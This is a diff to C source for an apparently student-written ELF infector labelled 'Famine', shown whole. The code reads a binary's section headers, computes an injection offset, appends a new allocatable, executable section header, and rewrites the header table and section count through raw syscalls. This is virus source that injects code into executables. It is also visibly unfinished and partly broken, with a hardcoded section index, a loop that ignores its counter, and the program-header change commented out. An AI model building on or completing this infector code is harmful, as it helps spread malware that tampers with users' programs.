@@ -6,6 +6,17 @@ struct indexAndOffset {
     unsigned long int offset;
 };
 
+void ft_print_hexa_raw(unsigned char *buf, size_t len) {
+    size_t i = 0;
+    while (i < len) {
+        if (i % 40 == 0)
+            printf("\n");
+        printf("%.2hhx ", buf[i]);
+        i++;
+    }
+    printf("\n");
+}
+
 
 void    findLastExecSectionAndSegment(struct sheaders64 *sHdrs, struct pheaders64 *pHdrs, struct ELFheaders64 fHdr, int *last_pHdr_exec, int *last_sHdr_exec) {
     int i = 0;
@@ -59,7 +70,7 @@ struct indexAndOffset find_injection_position(int fd, struct ELFheaders64 fHdr, 
 }
 
 void change_file_header(int fd, struct ELFheaders64 fHdr, unsigned long int offset_injection, struct sheaders64 *sHdrs) {
-    unsigned char tmp[fHdr.e_shnum * (fHdr.e_shentsize + 1)];
+    unsigned char tmp[fHdr.e_shentsize * (fHdr.e_shnum + 1)];
     struct sheaders64 new_header;
 
     new_header.sh_addr = 0x0;
@@ -68,29 +79,27 @@ void change_file_header(int fd, struct ELFheaders64 fHdr, unsigned long int offs
     new_header.sh_flags = 0x1 | 0x4;
     new_header.sh_info = 0x0;
     new_header.sh_link = 0x0;
-    new_header.sh_name = 0;
-    new_header.sh_offset = sHdrs[fHdr.e_shnum - 1].sh_offset + sHdrs[fHdr.e_shnum - 1].sh_size + 0x1;
+    new_header.sh_name = 0x0;
+    new_header.sh_offset = sHdrs[27].sh_offset + sHdrs[27].sh_size + 0x1;
     new_header.sh_size = 0x2000;
     new_header.sh_type = 0x1;
 
-    dprintf(1, "fd = %d\n", fd);
-    ft_syscall(LSEEK, (void *)fd, (void *)fHdr.e_shoff, 0, 0);
-    ft_syscall(READ, (void *)fd, (void *)&(tmp[fHdr.e_shentsize]), (void *)(fHdr.e_shnum * (fHdr.e_shentsize - 1)), 0);
-    memncat(tmp, 0, &new_header, sizeof(new_header));
+    unsigned long int sum = sHdrs[27].sh_offset;
+    printf("size = %lx\n", sHdrs[27].sh_size);
+    for (int i = 27; i < fHdr.e_shnum; i++) {
+        sum += sHdrs[27].sh_size;
+        sHdrs[27 + 1].sh_offset = new_header.sh_offset + new_header.sh_size;
 
-    // ft_syscall(LSEEK, (void *)fd, (void *)0x18, 0, 0);
-    // ft_syscall(WRITE, (void *)fd, (void *)&offset_injection, (void *)8, 0);
+    }
+    // ft_syscall(LSEEK, (void *)fd, (void *)fHdr.e_shoff, 0, 0);
+    // ft_syscall(READ, (void *)fd, (void *)tmp, (void *)(fHdr.e_shnum * (fHdr.e_shentsize)), 0);
+    memncat(tmp, 0, sHdrs, fHdr.e_shnum * fHdr.e_shentsize);
+    memncat(tmp, fHdr.e_shnum * (fHdr.e_shentsize), &new_header, sizeof(new_header));
 
-
-    // fHdr.e_shoff = fHdr.e_shoff + fHdr.e_shentsize;
-    // ft_syscall(LSEEK, (void *)fd, (void *)0x28, 0, 0);
-    // ft_syscall(WRITE, (void *)fd, (void *)&fHdr.e_shoff, (void *)8, 0);
-dprintf(1, "fd = %d\n", fd);
     fHdr.e_shnum = fHdr.e_shnum + 1;
     ft_syscall(LSEEK, (void *)fd, (void *)0x3c, 0, 0);
     ft_syscall(WRITE, (void *)fd, (void *)&fHdr.e_shnum, (void *)8, 0);
-dprintf(1, "fd = %d\n", fd);
-    ft_syscall(LSEEK, (void *)fd, (void *)(fHdr.e_shnum + fHdr.e_shentsize), 0, 0);
+    ft_syscall(LSEEK, (void *)fd, (void *)fHdr.e_shoff, 0, 0);
     ft_syscall(WRITE, (void *)fd, (void *)tmp, (void *)(fHdr.e_shnum * fHdr.e_shentsize), 0);
 }
 
@@ -118,13 +127,19 @@ unsigned long int    writeFile(int fd, struct ELFheaders64 fHdr) {
     const char signature[] = "Famine version 1.0 (c)oded by <pgoudet>-<Mastermind pgoudet>";
     struct sheaders64 sHdrs[fHdr.e_shnum + 1];
     struct pheaders64 pHdrs[fHdr.e_phnum];
-    int res;
+    int res, bytes_rd;
+
+    if(ft_syscall(LSEEK, (void *)fd, (void *)fHdr.e_shoff, 0, 0) == -1)
+        return (0);
+    bytes_rd = (int)ft_syscall(READ, (void *)fd, (void *)&sHdrs, (void *)(fHdr.e_shnum * fHdr.e_shentsize), 0);
+    if (bytes_rd < fHdr.e_shnum * fHdr.e_shentsize)
+        return (0);
 
     if (increaseFileSize(fd) == 1)
         return (0);
     offset_injection = fHdr.e_shoff + fHdr.e_shentsize * fHdr.e_shnum + sHdrs[fHdr.e_shnum - 1].sh_size + 0x1;
     change_file_header(fd, fHdr, offset_injection, sHdrs);
-    change_program(fd, fHdr, pHdrs);
+    // change_program(fd, fHdr, pHdrs);
     return (offset_injection);
 
 }
